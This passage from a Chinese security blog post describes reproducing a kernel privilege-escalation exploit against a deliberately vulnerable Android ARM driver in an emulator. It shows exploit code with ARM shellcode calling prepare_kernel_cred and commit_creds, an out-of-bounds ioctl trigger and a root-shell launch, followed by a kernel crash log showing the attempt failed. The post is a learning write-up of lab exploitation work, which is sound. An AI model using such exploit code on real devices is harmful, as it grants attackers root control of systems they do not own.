&#x2F;&#x2F;先将prepare_kernel_creds的位置放入r3，在把参数赋为0，即prepare_kernel_creds（0）</span><br><span class="line">    &#x2F;&#x2F;调用r3内的函数（即prepare_kernel_creds）后，由于r0同时担当了保存返回值的角色，于是只需将接下来调用的寄存器赋为commit_creds即可</span><br><span class="line">        __u32 jump[] &#x3D; &#123;</span><br><span class="line">           &#x2F;&#x2F;00000000 &lt;_start&gt;:</span><br><span class="line">           &#x2F;*   0:*&#x2F;   0xe92d4010,           &#x2F;&#x2F;  push    &#123;r4, lr&#125;</span><br><span class="line">           &#x2F;*   4:*&#x2F;   0xe59f3010,           &#x2F;&#x2F;  ldr r3, [pc, #16]   ; 1c &lt;_start+0x1c&gt; (prepare_kernel_creds)</span><br><span class="line">           &#x2F;*   8:*&#x2F;   0xe3a00000,           &#x2F;&#x2F;  mov r0, #0</span><br><span class="line">           &#x2F;*   c:*&#x2F;   0xe12fff33,           &#x2F;&#x2F;  blx r3</span><br><span class="line">           &#x2F;*  10:*&#x2F;   0xe59f3008,           &#x2F;&#x2F;  ldr r3, [pc, #8]    ; 20 &lt;_start+0x20&gt;  (commit_creds)</span><br><span class="line">           &#x2F;*  14:*&#x2F;   0xe12fff33,           &#x2F;&#x2F;  blx r3</span><br><span class="line">           &#x2F;*  18:*&#x2F;   0xe8bd8010,           &#x2F;&#x2F;  pop &#123;r4, pc&#125;</span><br><span class="line">           &#x2F;*  1c:*&#x2F;   prepare_kernel_cred,  &#x2F;&#x2F;  .word   prepare_kernel_cred</span><br><span class="line">           &#x2F;*  20:*&#x2F;   commit_creds          &#x2F;&#x2F;  .word   commit_creds</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    memcpy( (void*)mmap_start+mmap_size - sizeof(jump), jump, sizeof(jump));</span><br><span class="line"></span><br><span class="line">    &#x2F;*这里看一下触发的函数吧,都是OOB，但是没那么复杂，不需要构造socket交互，而是换为了ioctl</span><br><span class="line">    CommandHandler handlers[] &#x3D; &#123;</span><br><span class="line">       &#123;</span><br><span class="line">         .runHandler &#x3D; &amp;doNothingIntializer</span><br><span class="line">       &#125;,</span><br><span class="line">       &#123;</span><br><span class="line">         .runHandler &#x3D; &amp;doNothingIntializer</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    long ai_ch_ioctl(struct file *filp,</span><br><span class="line">                      unsigned int cmd,</span><br><span class="line">                      unsigned long arg)</span><br><span class="line">    &#123;</span><br><span class="line">     unsigned int handler_index &#x3D; arg;</span><br><span class="line"></span><br><span class="line">      switch (cmd) &#123;</span><br><span class="line">        case RUN_COMMAND_HANDLER:</span><br><span class="line">           handlers[handler_index].runHandler();</span><br><span class="line">           break;</span><br><span class="line">        default :</span><br><span class="line">           printk(&quot;Unknown ioctl cmd: %d&quot;, cmd);</span><br><span class="line">           return -1;</span><br><span class="line">      &#125;</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;*&#x2F;</span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] Triggering the exploit\n&quot;);</span><br><span class="line">    int rc &#x3D; ioctl(cmd_handler, RUN_COMMAND_HANDLER, 0x601);</span><br><span class="line">    check(rc !&#x3D; -1, &quot;IOCTL failed&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;uid&#x3D;%d, euid&#x3D;%d\n&quot;,getuid(), geteuid() );</span><br><span class="line"></span><br><span class="line">    if(!getuid())</span><br><span class="line">      execl( &quot;&#x2F;system&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, (char*) NULL);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">  error:</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后运行时需要注意，不要用串了。。。我一开始用错一个exp，直接用了exploit-db上的exp，而其对应的linux内核版本是3.3-3.8，而在Android模拟器上复现的话，还是用ndk编译，且具体的数据构造和exp内容（特别是汇编部分）还是不一样的，注意查看下对应的系统结构比如下面这个，注意对应的gcc版本，一开始没注意还运行不起来。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version 3.4.67-g5e0dcfb (test@test-virtual-machine) (gcc version 4.6.x-google 20120106 (prerelease) (GCC) ) #1 PREEMPT Sun Mar 8 14:27:12 CST 2020</span><br></pre></td></tr></table></figure>

<p>执行后程序报错，可能还是有些不准，pc值是0有些迷惑。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Unable to handle kernel NULL pointer dereference at virtual address 00000000</span><br><span class="line">pgd &#x3D; d77c4000</span><br><span class="line">[00000000] *pgd&#x3D;177bc831, *pte&#x3D;00000000, *ppte&#x3D;00000000</span><br><span class="line">Internal error: Oops: 80000017 [#1] PREEMPT ARM</span><br><span class="line">CPU: 0    Not tainted  (3.4.67-g5e0dcfb #1)</span><br><span class="line">PC is at 0x0</span><br><span class="line">LR is at ai_ch_ioctl+0x20&#x2F;0x40</span><br><span class="line">pc : [&lt;00000000&gt;]    lr : [&lt;c025c1c0&gt;]    psr: 60000013</span><br><span class="line">sp : d77a3f18  ip : 00000005  fp : bec41b48</span><br><span class="line">r10: 00000000  r9 : d77a2000  r8 : 00000000</span><br><span class="line">r7 : 00000005  r6 : d768cc80  r5 : de05d590  r4 : 00000601</span><br><span class="line">r3 : 00000000  r2 : c04adc40  r1 : 00001337  r0 : d768cc80</span><br><span class="line">Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">Control: 10c53c7d  Table: 177c4059  DAC: 00000015</span><br><span class="line"></span><br><span class="line">[&lt;c025c1c0&gt;] (ai_ch_ioctl+0x20&#x2F;0x40) from [&lt;c00bf208&gt;] (do_vfs_ioctl+0x560&#x2F;0x5d4)</span><br><span class="line">[&lt;c00bf208&gt;] (do_vfs_ioctl+0x560&#x2F;0x5d4) from [&lt;c00bf2c8&gt;] (sys_ioctl+0x4c&#x2F;0x6c)</span><br><span class="line">[&lt;c00bf2c8&gt;] (sys_ioctl+0x4c&#x2F;0x6c) from [&lt;c000d680&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">Code: bad PC value</span><br><span class="line">---[ end trace 6e436d5d54b1e15f ]---</span><br><span class="line">Kernel panic - not syncing: Fatal exception</span><br></pre></td></tr></table></figure>

<p>未完待续吧，这个库里面还是有很多其他漏洞的，也推荐给想做arm上kernel漏洞复现的同学，但可能给android上的体会不太深，比较和Linux内核类似，且这次踩坑的时候心态有些炸了，具体的调试分析也直接草草分析过掉，希望下次能好些吧，争取复现下其他层次的漏洞。<br>唉，漫漫长路啊。。。</p>
</div><div class="article-tags size-small is-uppercase mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/vul/">vul</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">android kernel exploit第二弹</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/02/24/2020-2-24-CVE-2019-2234/"><span class="level-item">cve-2019-2234组件暴露漏洞分析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="/img/kkx.jpg" alt="Dawuge"></figure><p class="title is-size-4 is-block line-height-inherit">Dawuge</p><p class="is-size-6 is-block">Never limit yourself</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>HNUer</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">32</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">17</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">4</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Dawuge" target="_blank" rel="noopener">follow 一下</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Dawuge"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a></div></div></div><!--!--><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">友链</h3><ul class="menu-list"><li><a class="level is-mobile is-mobile" href="http://momomoxiaoxi.com/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">默小西</span></span><span class="level-right"><span class="level-item tag">momomoxiaoxi.com</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://nan01ab.github.io/archive" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">nan01ab</span></span><span class="level-right"><span class="level-item tag">nan01ab.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://n1rv0us.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">n1rv0us</span></span><span class="level-right"><span class="level-item tag">n1rv0us.github.io</span></span></a></li><li><a class="level is-mobile is-mobile" href="https://www.wenweizeng.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">薇薇</span></span><span class="level-right"><span class="level-item tag">www.wenweizeng.com</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">10</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/ctf/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/"><span class="level-start"><span class="level-item">fuzz</span></span><span class="level-end"><span class="level-item tag">6</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/fuzz/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/kernel/"><span class="level-start"><span class="level-item">kernel</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/fuzz/normal/"><span class="level-start"><span class="level-item">normal</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">10</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/notes/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/env/"><span class="level-start"><span class="level-item">env</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/hardware/"><span class="level-start"><span class="level-item">hardware</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/notes/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/vul/"><span class="level-start"><span class="level-item">vul</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/android/"><span class="level-start"><span class="level-item">android</span></span><span class="level-end"><span class="level-item tag">3</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/android/kernel/"><span class="level-start"><span class="level-item">kernel</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/vul/android/software/"><span class="level-start"><span class="level-item">software</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/vul/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">1</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/vul/windows/software/"><span class="level-start"><span class="level-item">software</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li></ul></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/fuzz/"><span class="tag">fuzz</span><span class="tag is-grey-lightest">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/notes/"><span class="tag">notes</span><span class="tag is-grey-lightest">10</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vul/"><span class="tag">vul</span><span class="tag is-grey-lightest">4</span></a></div></div></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2099-12-31T16:00:00.000Z">2100-01-01</time></p><p class="title is-6"><a class="link-muted" href="/2100/01/01/2100-1-1-dailyrecord/">日志</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2098-12-31T16:00:00.000Z">2099-01-01</time></p><p class="title is-6"><a class="link-muted" href="/2099/01/01/2099-1-1-cundang/">在其他平台放置的文章</a></p><p class="is-uppercase"></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-03-31T16:00:00.000Z">2020-04-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/01/android%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%BA%8C/">android kernel exploit第二弹</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-02-29T16:00:00.000Z">2020-03-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/">搭建android内核环境（顺带分析cve-2013-1763)</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-02-23T16:00:00.000Z">2020-02-24</time></p><p class="title is-6"><a class="link-muted" href="/2020/02/24/2020-2-24-CVE-2019-2234/">cve-2019-2234组件暴露漏洞分析</a></p><p class="is-uppercase"><a class="link-muted" href="/categories/vul/">vul</a> / <a class="link-muted" href="/categories/vul/android/">android</a> / <a class="link-muted" href="/categories/vul/android/software/">software</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2100/01/"><span class="level-start"><span class="level-item">一月 2100</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2099/01/"><span class="level-start"><span class="level-item">一月 2099</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/12/"><span class="level-start"><span class="level-item">十二月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/08/"><span class="level-start"><span class="level-item">八月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/06/"><span class="level-start"><span class="level-item">六月 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2019/05/"><span class="level-start"><span class="level-item">五月 2019</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/kkx.png" alt="Dawuge&#039;s blog" height="28"></a><p class="size-small"><span>&copy; 2020 Dawuge</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            site: {
                url: 'http://yoursite.com',
                external_link: {"enable":true,"exclude":[]}
            },
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>